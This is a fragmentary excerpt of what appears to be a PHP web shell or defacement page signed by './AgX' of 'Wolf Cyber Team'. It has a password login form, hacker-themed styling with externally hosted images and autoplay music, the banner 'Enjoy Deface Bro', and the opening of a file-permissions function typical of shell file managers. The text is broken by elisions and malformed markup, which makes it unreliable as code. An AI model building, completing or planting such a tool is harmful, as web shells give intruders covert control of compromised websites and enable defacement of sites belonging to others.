...
<br>
	<form method="post">
		<input background="black" type="password" name="password" placeholder="">
      <input class="by" type="submit" value="">
		<br>
		<br>
...
.destroy_table {;
  ...
  background-color: #000000;
            background-image: url(https://l.top4top.io/p_179148cue0.png);
...
<center>
<br>
<img src="https://l.top4top.io/p_179148cue0.png" width="300" heigth="300"><br>
<font face="Kelly Slab" color="white" size="7px">-=[ AgX ]=- </font><br>
</h1></center>
<center><b><font face="courier new" color="white" size="5">“ Enjoy Deface Bro XixiXi ”</font></b></center>
<marquee><b><fonte face="courier new" color="white" size="4">Wolf Cyber Team - And All My Friend</font></b></marquee>
<center><audio autoplay="autoplay" controls="controls" src="https://j.top4top.io/m_1776kgsk60.mp3" type="audio/mpeg"></audio></center>
...
+ Coded By   <td>: <font color='lime'> ./AgX | Silent Because Of Yourself<tr><td><font color='white'>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">Copyright &copy;2020 ./AgX |  Always30</center>
</body>
</html>';
function perms($file){
